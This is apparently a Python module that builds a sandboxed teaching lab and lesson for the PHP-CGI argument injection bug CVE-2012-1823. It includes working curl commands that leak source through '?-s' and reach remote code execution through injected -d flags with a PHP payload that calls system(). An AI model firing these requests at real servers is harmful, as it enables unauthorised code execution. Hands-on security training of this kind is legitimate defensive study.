"""PHP-CGI argument injection lab (CVE-2012-1823).

A stock php-cgi 5.4.1 behind Apache. When PHP runs as a CGI program, a request
query string that contains no "=" is handed to php-cgi as command-line
arguments. An attacker can therefore pass php-cgi flags like -s (dump source)
or -d (set an ini directive) through the URL, and chain -d allow_url_include=1
with -d auto_prepend_file=php://input to execute a PHP payload from the request
body -- remote code execution from a single GET/POST.
"""
import os

import modal

SLUG = "phpcgi"
APP_NAME = "piy-phpcgi"
SANDBOX_TIMEOUT = 900

_LAB = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "lab", "phpcgi"))


def _read(name: str) -> str:
    with open(os.path.join(_LAB, name), "r") as f:
        return f.read()


def build_image() -> modal.Image:
    return (
        modal.Image.from_registry("vulhub/php:5.4.1-cgi", add_python=None)
        .run_commands(
            "mkdir -p /usr/lib/cgi-bin",
            "cp /usr/local/bin/php-cgi /usr/lib/cgi-bin/php-cgi",
            "a2enmod cgid actions alias",
            "rm -f /var/www/html/index.html",
        )
        .add_local_file(os.path.join(_LAB, "index.php"), "/var/www/html/index.php", copy=True)
        .add_local_file(os.path.join(_LAB, "php-cgi.conf"), "/etc/apache2/conf-enabled/php-cgi.conf", copy=True)
    )


def summary() -> dict:
    return {"slug": SLUG, "title": "PHP-CGI Argument Injection",
            "subtitle": "When PHP runs as CGI, the query string after a '?' becomes command-line flags.",
            "cve": "CVE-2012-1823", "meta": "PHP php-cgi ≤ 5.4.1 · disclosed May 2012 · query string → argv"}


def build_lesson() -> dict:
    s = summary()
    s["blocks"] = [
        {"type": "markdown", "content": (
            "In 2012 it emerged that any site running PHP in **CGI mode** could be handed arbitrary "
            "command-line flags — and ultimately arbitrary code — through nothing but a crafted URL. The bug "
            "sat in `php-cgi`'s own argument parsing, so no vulnerable *application* code was required at all.\n\n"
            "Every step below runs against a **real php-cgi 5.4.1 behind Apache**, spun up just for you in an "
            "isolated sandbox. You'll turn a `?` in a URL into code execution on the server."
        )},
        {"type": "markdown", "content": (
            "## The victim: an ordinary PHP page\n\n"
            "Here is the entire web app. It greets you and prints the PHP version — no `system()`, no `eval`, "
            "nothing user-controlled reaching a dangerous sink. The application is not the problem; the way "
            "`php-cgi` is wired up is."
        )},
        {"type": "code", "language": "php", "title": "index.php", "content": _read("index.php")},
        {"type": "markdown", "content": (
            "## Step 1 — Start the server\n\n"
            "Boot Apache. It is configured the classic way: `.php` requests are handed to the `php-cgi` binary "
            "as a CGI program (see `php-cgi.conf`). This is exactly the deployment CVE-2012-1823 targets."
        )},
        {"type": "run", "title": "Start Apache + php-cgi", "kind": "background", "logfile": "/tmp/apache.log",
         "command": "source /etc/apache2/envvars && apache2ctl -D FOREGROUND",
         "explain": "Serves the page on port 80 with php-cgi handling .php files."},
        {"type": "markdown", "content": (
            "## Step 2 — A normal request\n\n"
            "Visit the page the ordinary way. You get back rendered HTML — the benign baseline."
        )},
        {"type": "run", "title": "Request the page normally", "kind": "foreground",
         "command": "curl -s 'http://127.0.0.1/index.php?name=Leah'",
         "explain": "A normal query string (name=Leah). PHP runs the script and returns HTML."},
        {"type": "markdown", "content": (
            "## Why this is dangerous\n\n"
            "The CGI specification says that if a query string contains **no `=` sign**, the web server should "
            "pass it to the CGI program split on `+` as command-line arguments. `php-cgi` is a real command-line "
            "program with real flags:\n\n"
            "- `-s` — dump the script's source code\n"
            "- `-d key=value` — set a php.ini directive\n"
            "- `-r code` — run PHP code directly\n\n"
            "So a URL like `index.php?-s` smuggles the `-s` flag straight into `php-cgi`. Watch."
        )},
        {"type": "run", "title": "Leak the source with ?-s", "kind": "foreground",
         "command": "curl -s 'http://127.0.0.1/index.php?-s' | head -40",
         "explain": "No '=' in the query string, so '-s' reaches php-cgi as a flag: it prints the source instead of running it."},
        {"type": "markdown", "content": (
            "## Step 3 — From flags to full RCE\n\n"
            "Leaking source is bad; running code is worse. We combine two `-d` directives:\n\n"
            "- `-d allow_url_include=1` — allow including from stream wrappers\n"
            "- `-d auto_prepend_file=php://input` — prepend the **raw request body** to every script and execute it\n\n"
            "Then we put a PHP payload in the POST body. php-cgi prepends and runs it before it ever touches "
            "`index.php`. The `+` characters are argument separators and `=` is URL-encoded as `%3d` so the "
            "query string still contains no literal `=`."
        )},
        {"type": "run", "title": "Execute code on the server", "kind": "foreground",
         "command": "curl -s -g 'http://127.0.0.1/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' --data '<?php echo \"RCE as \"; system(\"id; echo; uname -a\"); ?>'",
         "explain": "The query string injects the two -d flags; the POST body is the code php-cgi runs. The 'id' output is the victim executing our command."},
        {"type": "markdown", "content": (
            "## What just happened\n\n"
            "A single HTTP request made the server run `id` for us. The query string became `php-cgi` arguments, "
            "those arguments reconfigured PHP to execute our request body, and the body was our code. No "
            "application bug, no file upload — just php-cgi parsing a URL the way the CGI spec told it to.\n\n"
            "## The fix\n\n"
            "PHP **5.4.2** and **5.3.12** patched `php-cgi` to refuse query strings that begin with a `-` when "
            "they look like injected arguments. The broader lesson echoes across this whole site: a component "
            "that quietly treats attacker input as *instructions* (here, command-line flags) is a time bomb. "
            "(A closely-related reincarnation, CVE-2024-4577, hit php-cgi on Windows in 2024 via encoding tricks.)"
        )},
    ]
    return s
